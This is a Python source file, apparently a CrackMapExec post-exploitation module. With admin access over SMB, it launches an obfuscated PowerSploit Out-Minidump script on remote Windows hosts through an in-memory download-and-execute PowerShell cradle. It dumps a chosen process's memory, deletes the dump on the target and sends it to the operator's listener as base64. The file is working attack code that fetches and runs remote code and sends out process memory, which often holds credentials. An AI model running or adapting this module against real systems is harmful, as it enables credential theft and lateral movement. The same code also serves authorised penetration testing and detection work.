import base64

class CMEModule:
    '''
        Uploads the procdump executable, dumps the memory of the specified process and downloads the memory dump.
        Module by @m_nad0 - All of the sweet magic behind this module comes from Out-Minidump by Matthew Graeber (@mattifestation)
    '''
    name = 'out_minidump'
    description = 'Executes the PowerSploit Out-Minidump script and downloads the result'
    supported_protocols = ['smb']
    opsec_safe= False # The module touches disk with the output of the memory dump
    multiple_hosts = True

    def options(self, context, module_options):
        '''
           PROCESS      The name of the process for which a dump will be generated
           DUMP_PATH    The path where dump files will be written
        '''
        if module_options and 'PROCESS' in module_options:
            self.process = module_options['PROCESS']
        else:
            context.log.error('PROCESS option is required!')
            exit(1)

        if module_options and 'DUMP_PATH' in module_options:
            self.dump_path = module_options['DUMP_PATH']
        else:
            self.dump_path = "$Env:Temp"

        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Out-Minidump.ps1')

    def on_admin_login(self, context, connection):
        command = "$($res = Out-Minidump (Get-Process '{}') {};$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($res.FullName));Remove-Item $res.FullName;$content)".format(self.process, self.dump_path, self.dump_path, self.dump_path)
        launcher = gen_ps_iex_cradle(context, 'Out-Minidump.ps1', command)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Out-Minidump.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script)
        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        # We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            log_name = '{}-{}-{}.dmp'.format(self.process, response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            with open(log_name, 'wb') as key_file:
                key_file.write(base64.b64decode(data))
                context.log.info("Saved Out-Minidump output to {}".format(log_name))
